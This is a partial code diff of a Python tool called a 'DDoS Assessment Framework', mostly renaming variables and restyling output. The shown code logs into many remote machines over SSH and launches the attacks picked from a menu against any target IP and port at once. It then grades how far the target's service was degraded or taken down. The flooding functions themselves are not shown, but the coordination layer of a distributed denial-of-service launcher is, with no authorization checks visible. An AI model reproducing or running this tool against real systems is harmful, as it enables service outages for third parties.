+        target_monitor.establish_baseline()
         print()
 
-        for attackIndex, attackName in enumerate(self.selectedAttacks, 1):
+        for attack_idx, attack_name in enumerate(self.selected_attacks, 1):
             if not self.running or GLOBAL_SHUTDOWN:
                 break
 
-            print(f"{'=' * 150}")
-            print(f"[Attack {attackIndex}/{len(self.selectedAttacks)}] {attackName}")
-            print(f"{'=' * 150}\n")
+            print(f"{'='*150}")
+            print(f"[ATTACK {attack_idx}/{len(self.selected_attacks)}] {attack_name}")
+            print(f"{'='*150}\n")
 
-            targetMonitor.measurements = []
-            targetMonitor.startMonitoring()
-            displayThread = SingleLineDisplayThread(targetMonitor, instances, duration=self.duration)
-            displayThread.start()
+            target_monitor.measurements = []
+            target_monitor.start_monitoring()
+            display = SingleLineDisplayThread(target_monitor, instances, duration=self.duration)
+            display.start()
 
-            print(f"[*] Deploying attack on {len(instances)} instances...")
+            print(f"[*] Deploying HYBRID attack on {len(instances)} instances...")
             with ThreadPoolExecutor(max_workers=len(instances)) as executor:
                 futures = {
                     executor.submit(
-                        inst.executeAttack, self.targetIp, self.targetPort, attackName, self.duration
+                        inst.execute_attack, self.target_ip, self.target_port, attack_name, self.duration
                     ): inst for inst in instances
                 }
-                for _ in as_completed(futures):
+                for future in as_completed(futures):
                     pass
-            print(f"[✓] Attack deployed (Multiprocessing + Threading)\n")
+            print(f"[✓] HYBRID attack deployed (Multiprocessing + Threading)\n")
 
             elapsed = 0.0
             while elapsed < self.duration and not GLOBAL_SHUTDOWN:
                 time.sleep(0.1)
                 elapsed += 0.1
 
-            displayThread.stop()
-            targetMonitor.stopMonitoring()
+            display.stop()
+            target_monitor.stop_monitoring()
 
-            stats = targetMonitor.getStatistics()
-            verdict = self._assessVulnerability(stats)
-            self.results.append({"attack": attackName, "stats": stats, "verdict": verdict})
+            stats = target_monitor.get_statistics()
+            verdict = self._assess_vulnerability(stats)
+            self.results.append({"attack": attack_name, "stats": stats, "verdict": verdict})
 
-            print(f"\n{'-' * 150}")
-            print(f"[Verdict] {attackName}")
-            print(f"{'-' * 150}")
+            print(f"\n{'-'*150}")
+            print(f"[VERDICT] {attack_name}")
+            print(f"{'-'*150}")
             print(
-                f" Checks: {stats['total']} | Timeouts: {stats['timeouts']} ({stats['timeoutPct']:.1f}%)",
+                f" Checks: {stats['total']} | Timeouts: {stats['timeouts']} ({stats['timeout_pct']:.1f}%)",
                 end=""
             )
-            if stats['avgResponse']:
+            if stats['avg_response']:
                 print(
-                    f" | AvgResponse: {stats['avgResponse']:.2f}ms "
-                    f"| Degradation: {stats['degradationPct']:+.1f}%"
+                    f" | Avg response time: {stats['avg_response']:.2f}ms "
+                    f"| Degradation: {stats['degradation_pct']:+.1f}%"
                 )
             else:
                 print()
             print(f" Status: {verdict['status']} - {verdict['description']}")
-            print(f"{'-' * 150}\n")
+            print(f"{'-'*150}\n")
 
-            if attackIndex < len(self.selectedAttacks):
+            if attack_idx < len(self.selected_attacks):
                 print(f"[*] Stabilization (5s)...\n")
                 time.sleep(5)
 
-        self._printFinalReport()
+        self._print_final_report()
 
-    def _assessVulnerability(self, stats: Dict) -> Dict:
-        timeoutPct = stats['timeoutPct']
-        degradation = stats['degradationPct']
+    def _assess_vulnerability(self, stats: Dict) -> Dict:
+        timeout_pct = stats['timeout_pct']
+        degradation = stats['degradation_pct']
 
-        if timeoutPct >= 50:
-            return {"status": "Critical", "severity": 5, "description": "Service down - multiple timeouts"}
-        elif timeoutPct >= 25:
-            return {"status": "High", "severity": 4, "description": "Severe degradation - high timeout rate"}
-        elif timeoutPct >= 10:
-            return {"status": "Medium", "severity": 3, "description": "Moderate impact - noticeable timeouts"}
+        if timeout_pct >= 50:
+            return {"status": "CRITICAL ⚠", "severity": 5, "description": "Service DOWN - Multiple timeouts"}
+        elif timeout_pct >= 25:
+            return {"status": "HIGH 🔴", "severity": 4, "description": "Severe degradation - High timeout rate"}
+        elif timeout_pct >= 10:
+            return {"status": "MEDIUM 🟠", "severity": 3, "description": "Moderate impact - Noticeable timeouts"}
         elif degradation >= 300:
-            return {"status": "Medium", "severity": 3, "description": f"Severe latency increase (+{degradation:.0f}%)"}
+            return {"status": "MEDIUM 🟠", "severity": 3, "description": f"Severe latency increase (+{degradation:.0f}%)"}
         elif degradation >= 150:
-            return {"status": "Low", "severity": 2, "description": f"Significant latency increase (+{degradation:.0f}%)"}
+            return {"status": "LOW 🟡", "severity": 2, "description": f"Significant latency increase (+{degradation:.0f}%)"}
         elif degradation >= 50:
-            return {"status": "Info", "severity": 1, "description": f"Minor latency increase (+{degradation:.0f}%)"}
+            return {"status": "INFO 🔵", "severity": 1, "description": f"Minor latency increase (+{degradation:.0f}%)"}
         else:
-            return {"status": "Resilient", "severity": 0, "description": "Target remained stable"}
+            return {"status": "RESILIENT ✅", "severity": 0, "description": "Target remained stable"}
 
-    def _printFinalReport(self):
-        print(f"{'=' * 150}")
-        print(f"Final Assessment Report - {self.targetIp}:{self.targetPort}")
-        print(f"{'=' * 150}\n")
-        print(f"{'Attack':<45} | {'TimeoutPct':<10} | {'AvgResp':<12} | {'Degrade':<10} | {'Verdict':<30}")
-        print(f"{'-' * 150}")
+    def _print_final_report(self):
+        print(f"{'='*150}")
+        print(f"FINAL ASSESSMENT REPORT - {self.target_ip}:{self.target_port}")
+        print(f"{'='*150}\n")
+        print(f"{'ATTACK':<45} | {'TIMEOUT%':<10} | {'AVG RESP':<12} | {'DEGRADE':<10} | {'VERDICT':<30}")
+        print(f"{'-'*150}")
         for result in self.results:
             attack = result['attack'].split(' - ')[0][:43]
             stats = result['stats']
             verdict = result['verdict']
-            timeoutStr = f"{stats['timeoutPct']:.1f}%"
-            respStr = f"{stats['avgResponse']:.2f}ms" if stats['avgResponse'] else "N/A"
-            degradeStr = f"{stats['degradationPct']:+.0f}%" if stats['degradationPct'] != 0 else "0%"
-            verdictStr = verdict['status']
-            print(f"{attack:<45} | {timeoutStr:<10} | {respStr:<12} | {degradeStr:<10} | {verdictStr:<30}")
-        print(f"{'=' * 150}\n")
+            timeout_str = f"{stats['timeout_pct']:.1f}%"
+            resp_str = f"{stats['avg_response']:.2f}ms" if stats['avg_response'] else "N/A"
+            degrade_str = f"{stats['degradation_pct']:+.0f}%" if stats['degradation_pct'] != 0 else "0%"
+            verdict_str = verdict['status']
+            print(f"{attack:<45} | {timeout_str:<10} | {resp_str:<12} | {degrade_str:<10} | {verdict_str:<30}")
+        print(f"{'='*150}\n")
 
         if not self.results:
-            print("[FinalVerdict] No attacks executed")
-            print(f"\n{'=' * 150}\n")
+            print("[FINAL VERDICT] No attacks executed")
+            print(f"\n{'='*150}\n")
             return
 
-        maxSeverity = max([r['verdict']['severity'] for r in self.results])
-        criticalCount = len([r for r in self.results if r['verdict']['severity'] >= 4])
-        highCount = len([r for r in self.results if r['verdict']['severity'] == 3])
+        max_severity = max([r['verdict']['severity'] for r in self.results])
+        critical_count = len([r for r in self.results if r['verdict']['severity'] >= 4])
+        high_count = len([r for r in self.results if r['verdict']['severity'] == 3])
 
-        if maxSeverity >= 5:
-            overall = f"Critical Vulnerability - service went down in {criticalCount} attack(s)"
-        elif maxSeverity >= 4:
-            overall = f"High Vulnerability - severe degradation in {criticalCount} attack(s)"
-        elif maxSeverity >= 3:
-            overall = f"Medium Vulnerability - moderate impact in {highCount} attack(s)"
-        elif maxSeverity >= 2:
-            overall = "Low Vulnerability - minor issues detected"
+        if max_severity >= 5:
+            overall = f"CRITICAL VULNERABILITY ⚠ - Service went down in {critical_count} attack(s)"
+        elif max_severity >= 4:
+            overall = f"HIGH VULNERABILITY 🔴 - Severe degradation in {critical_count} attack(s)"
+        elif max_severity >= 3:
+            overall = f"MEDIUM VULNERABILITY 🟠 - Moderate impact in {high_count} attack(s)"
+        elif max_severity >= 2:
+            overall = "LOW VULNERABILITY 🟡 - Minor issues detected"
         else:
-            overall = "Resilient - target handled all attacks successfully"
+            overall = "RESILIENT ✅ - Target handled all attacks successfully"
 
-        print(f"[FinalVerdict] {overall}")
-        print(f"\n{'=' * 150}\n")
+        print(f"[FINAL VERDICT] {overall}")
+        print(f"\n{'='*150}\n")
 
     def cleanup(self, instances: List[SSHInstance]):
         print("[*] Cleanup...")
@@ -1020,52 +999,52 @@ class DDoSAssessmentFramework:
             inst.disconnect()
         print("[✓] Done\n")
 
-def parseArgs():
-    parser = argparse.ArgumentParser(description='DDoS Security Assessment Framework v1.0 - All 15 Vectors')
+def parse_args():
+    parser = argparse.ArgumentParser(description='Hybrid DDoS Assessment')
     parser.add_argument('-u', '--username', required=True)
     parser.add_argument('-p', '--password', required=True)
     parser.add_argument('-ips', '--instances', required=True)
     parser.add_argument('-t', '--target', required=True)
     parser.add_argument('-pt', '--port', type=int, default=80)
     parser.add_argument('-d', '--duration', type=int, default=120)
-    parser.add_argument('-sp', '--sshPort', type=int, default=22)
+    parser.add_argument('-sp', '--ssh-port', type=int, default=22)
     return parser.parse_args()
 
-def parseIps(ipInput: str) -> List[str]:
-    if os.path.isfile(ipInput):
-        with open(ipInput) as fileHandle:
-            return [line.strip() for line in fileHandle if line.strip() and not line.startswith('#')]
-    return [ip.strip() for ip in ipInput.split(',')]
+def parse_ips(ip_input: str) -> List[str]:
+    if os.path.isfile(ip_input):
+        with open(ip_input) as f:
+            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    return [ip.strip() for ip in ip_input.split(',')]
 
 def main():
-    args = parseArgs()
-    print("\n" + "=" * 150)
-    print("DDoS Security Assessment Framework v1.0 - All 15 Vectors With Proven Techniques")
-    print("✓ Multiprocessing + Threading (50 threads per process) | ✓ CpuAdaptive (80-85%) | ✓ 10x-60x Multiplier")
-    print("=" * 150)
+    args = parse_args()
+    print("\n"+"="*150)
+    print("HYBRID DDoS ASSESSMENT")
+    print("✓ Multiprocessing + Threading (50 threads per process) | ✓ CPU-Adaptive (80-85%) | ✓ 10x-60x multiplier")
+    print("="*150)
     logger = CentralizedLoggingManager()
-    instancesIps = parseIps(args.instances)
-    if not instancesIps:
+    instances_ips = parse_ips(args.instances)
+    if not instances_ips:
         print("[!] No instances")
         return
-    sshInstances = []
-    for ip in instancesIps:
-        instanceLogger = logger._setupLogger(f"Instance_{ip}", f"instance_{ip}.log")
-        sshInstances.append(SSHInstance(ip, args.username, args.password, args.sshPort, instanceLogger=instanceLogger))
-    selectedAttacks = displayAttackMenu(AVAILABLE_ATTACKS)
-    framework = DDoSAssessmentFramework(sshInstances, args.target, args.port, logger, selectedAttacks, args.duration)
-    readyInstances = framework.setupInstances()
-    if readyInstances and not GLOBAL_SHUTDOWN:
+    ssh_instances = []
+    for ip in instances_ips:
+        inst_logger = logger._setup_logger(f"Instance_{ip}", f"instance_{ip}.log")
+        ssh_instances.append(SSHInstance(ip, args.username, args.password, args.ssh_port, instance_logger=inst_logger))
+    selected_attacks = display_attack_menu(AVAILABLE_ATTACKS)
+    framework = DDoSAssessmentFramework(ssh_instances, args.target, args.port, logger, selected_attacks, args.duration)
+    ready = framework.setup_instances()
+    if ready and not GLOBAL_SHUTDOWN:
         try:
-            framework.runAssessment(readyInstances)
-        except Exception as error:
+            framework.run_assessment(ready)
+        except Exception as e:
             if not GLOBAL_SHUTDOWN:
-                print(f"[!] Error: {error}")
+                print(f"[!] Error: {e}")
         finally:
-            framework.cleanup(readyInstances)
-    print("=" * 150)
-    print(f"[✓] Complete | Logs: {logger.runDir}")
-    print("=" * 150 + "\n")
+            framework.cleanup(ready)
+    print("="*150)
+    print(f"[✓] COMPLETE | Logs: {logger.run_dir}")
+    print("="*150+"\n")
 
 if __name__ == "__main__":
     main()
